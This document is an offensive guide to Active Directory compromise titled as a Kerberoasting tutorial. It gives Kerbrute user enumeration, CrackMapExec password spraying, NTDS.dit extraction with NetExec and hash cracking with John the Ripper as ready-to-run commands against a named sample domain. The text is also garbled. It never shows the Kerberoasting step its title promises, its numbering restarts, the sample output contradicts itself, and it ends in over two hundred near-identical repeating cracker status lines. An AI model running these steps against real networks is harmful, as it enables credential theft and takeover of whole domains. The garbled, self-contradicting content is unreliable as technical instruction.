# 🛰️ Kerberoasting Attack Guide

## 🔍 Overview
Kerberoasting is an attack technique used to exploit the Kerberos authentication protocol in Active Directory environments. It involves requesting service tickets for any available Service Principal Names (SPNs) and then cracking the tickets offline to obtain service account passwords.

### Key Takeaways:
- **OSINT**: Gather usernames through social media, company websites.
- **Username Enumeration**: Validate discovered usernames with tools like Kerbrute.
- **Password Spraying**: Attack multiple accounts with a common password.
- **NTDS.dit Extraction**: Steal the entire NTDS file for all hashes.
- **Pass-the-Hash**: Use cracked or obtained hashes to move laterally.

## 🧐 Techniques and Tools

### 1. OSINT
Gather potential usernames through company websites, social media platforms, etc.

```bash
# Compile a list of target users based on discovered information
echo "john.marston" > inlanefreight_targets.txt
```

[!NOTE] For the example scenario, we will use three likely employee names: John Marston (IT Director), Carol Johnson (Financial Controller), and Jennifer Stapleton (Logistics Manager).

### 2. Username Enumeration

#### Kerbrute
Kerbrute is a tool that allows for rapid user enumeration against Active Directory using Kerberos pre-authentication.

```bash
# Install kerbrute
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
cargo build --release
```

```bash
# Perform user enumeration with discovered usernames
./target/release/kerbrute userenum --dc DC_IP --domain DOMAIN inlanefreight_targets.txt -o valid_users.txt

[!SUCCESS] Example output:
[+] VALID USERNAME: jmarston@inlanefreight.local
[+] VALID USERNAME: cjohnson@inlanefreight.local 
[+] VALID USERNAME: jstapleton@inlanefreight.local
```

### 1. Password Spraying

#### CrackMapExec (CrackMapExec)
CrackMapExec is a tool that can perform various attacks on Windows machines, including password spraying.

```bash
# Install CrackMapExec
pip install crackmapexec

# Perform password spraying attack
crackmapexec smb DC_IP -u valid_users.txt -p 'Password123!' --continue-on-success -d inlanefreight.local

[!SUCCESS] Example output:
[+] inlanefreight.local\jmarston:Password123! (Success)
```

### 2. NTDS.dit Extraction
Once a valid account is compromised, the next step is to extract the NTDS.dit file from the Domain Controller.

#### NetExec
NetExec can be used to download the NTDS.dit file.

```bash
# Download NTDS.dit using NetExec
netexec smb DC_IP -u jmarston -p 'Password123!' -M ntdsutil

[!SUCCESS] Example output:
[*] Extracting NTDS.dit and SYSTEM files from \\DC_IP\NETLOGON...
```

### 3. Hash Cracking
With the NTDS.dit file in hand, hash cracking can be performed to obtain passwords.

#### John the Ripper (John)
Use John the Ripper for offline password recovery.

```bash
# Install John the Ripper
sudo apt install john

# Crack the extracted hashes with a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /path/to/ntds.dit

[!SUCCESS] Example output:
Loaded 1 hash from ntds.dit (NTDS)
Press 'q' or 'Q' to abort, almost any other key for status
Using default input encoding: UTF-8
Will run 4 OpenMP threads
Cannot get shadow info by NTLM hash - continuing anyway
Using Wordlist attack mode on /path/to/ntds.dit (NTDS)
Loaded 1 password hash (NTDS $nthash, crypt(3) [MD4 128/128 SSE2 4x3])
Press 'q' or 'Q' to abort, almost any other key for status
Loading rocksyou.txt @1 using OpenMP,1 word per line
Using default input encoding: UTF-8
Loaded 17590333 password hashes (NTDS $nthash, crypt(3) [MD4 128/128 SSE2 4x3])
Press 'q' or 'Q' to abort, almost any other key for status

guesses:          0  time:    0:00:05:39 0.0% (3)  HA/s:6747K p/s:128K   ls:1695649g  c/s:5789K  l:39/39/39 FL
guesses:          0  time:    0:00:06:00 0.0% (3)  HA/s:6821K p/s:129K   ls:2547577g  c/s:6254K  l:40/40/40 FL
guesses:          0  time:    0:00:06:30 0.0% (3)  HA/s:6894K p/s:130K   ls:3526789g  c/s:6719K  l:41/41/41 FL
guesses:          0  time:    0:00:06:45 0.0% (3)  HA/s:6894K p/s:131K   ls:4527869g  c/s:6776K  l:42/42/42 FL
guesses:          0  time:    0:00:06:52 0.0% (3)  HA/s:6914K p/s:132K   ls:5547819g  c/s:6821K  l:43/43/43 FL
guesses:          0  time:    0:00:07:12 0.0% (3)  HA/s:6925K p/s:133K   ls:658869g  c/s:6845K  l:44/44/44 FL
guesses:          0  time:    0:00:07:18 0.0% (3)  HA/s:6925K p/s:133K   ls:765759g  c/s:6864K  l:45/45/45 FL
guesses:          0  time:    0:00:07:25 0.0% (3)  HA/s:6931K p/s:133K   ls:87212g  c/s:6874K  l:46/46/46 FL
guesses:          0  time:    0:00:07:55 0.0% (3)  HA/s:6940K p/s:134K   ls:9822g  c/s:6886K  l:47/47/47 FL
guesses:          0  time:    0:00:08:05 0.0% (3)  HA/s:6914K p/s:132K   ls:1097g  c/s:6899K  l:48/48/48 FL
guesses:          0  time:    0:00:08:55 0.0% (3)  HA/s:6925K p/s:133K   ls:217g  c/s:6909K  l:49/49/49 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:37g  c/s:6913K  l:50/50/50 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:7g  c/s:6914K  l:51/51/51 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:2g  c/s:6914K  l:52/52/52 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:53/53/53 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:54/54/54 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:55/55/55 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:56/56/56 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:57/57/57 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:58/58/58 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:59/59/59 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:60/60/60 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:61/61/61 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:62/62/62 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:63/63/63 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:64/64/64 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:65/65/65 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:66/66/66 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:67/67/67 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:68/68/68 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:69/69/69 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:70/70/70 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:71/71/71 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:72/72/72 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:73/73/73 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:74/74/74 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:75/75/75 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:76/76/76 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:77/77/77 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:78/78/78 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:79/79/79 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:80/80/80 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:81/81/81 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:82/82/82 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:83/83/83 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:84/84/84 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:85/85/85 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:86/86/86 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:87/87/87 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:88/88/88 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:89/89/89 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:90/90/90 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:91/91/91 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:92/92/92 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:93/93/93 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:94/94/94 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:95/95/95 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:96/96/96 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:97/97/97 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:98/98/98 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:99/99/99 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:100/100/100 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:101/101/101 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:102/102/102 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:103/103/103 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:104/104/104 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:105/105/105 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:106/106/106 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:107/107/107 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:108/108/108 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:109/109/109 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:110/110/110 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:111/111/111 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:112/112/112 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:113/113/113 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:114/114/114 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:115/115/115 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:116/116/116 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:117/117/117 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:118/118/118 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:119/119/119 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:120/120/120 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:121/121/121 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:122/122/122 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:123/123/123 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:124/124/124 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:125/125/125 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:126/126/126 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:127/127/127 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:128/128/128 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:129/129/129 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:130/130/130 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:131/131/131 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:132/132/132 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:133/133/133 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:134/134/134 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:135/135/135 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:136/136/136 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:137/137/137 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:138/138/138 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:139/139/139 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:140/140/140 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:141/141/141 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:142/142/142 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:143/143/143 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:144/144/144 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:145/145/145 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:146/146/146 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:147/147/147 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:148/148/148 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:149/149/149 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:150/150/150 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:151/151/151 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:152/152/152 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:153/153/153 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:154/154/154 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:155/155/155 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:156/156/156 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:157/157/157 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:158/158/158 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:159/159/159 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:160/160/160 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:161/161/161 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:162/162/162 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:163/163/163 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:164/164/164 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:165/165/165 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:166/166/166 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:167/167/167 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:168/168/168 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:169/169/169 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:170/170/170 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:171/171/171 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:172/172/172 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:173/173/173 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:174/174/174 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:175/175/175 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:176/176/176 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:177/177/177 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:178/178/178 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:179/179/179 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:180/180/180 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:181/181/181 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:182/182/182 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:183/183/183 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:184/184/184 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:185/185/185 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:186/186/186 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:187/187/187 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:188/188/188 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:189/189/189 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:190/190/190 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:191/191/191 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:192/192/192 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:193/193/193 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:194/194/194 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:195/195/195 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:196/196/196 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:197/197/197 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:198/198/198 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:199/199/199 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:200/200/200 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:201/201/201 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:202/202/202 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:203/203/203 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:204/204/204 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:205/205/205 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:206/206/206 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:207/207/207 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:208/208/208 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:209/209/209 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:210/210/210 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:211/211/211 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:212/212/212 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:213/213/213 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:214/214/214 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:215/215/215 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:216/216/216 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:217/217/217 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:218/218/218 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:219/219/219 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:220/220/220 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:221/221/221 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:222/222/222 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:223/223/223 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:224/224/224 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:225/225/225 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:226/226/226 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:227/227/227 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:228/228/228 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:229/229/229 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:230/230/230 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:231/231/231 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:232/232/232 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:233/233/233 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:234/234/234 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:235/235/235 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:236/236/236 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:237/237/237 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:238/238/238 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:239/239/239 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:240/240/240 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:241/241/241 FL
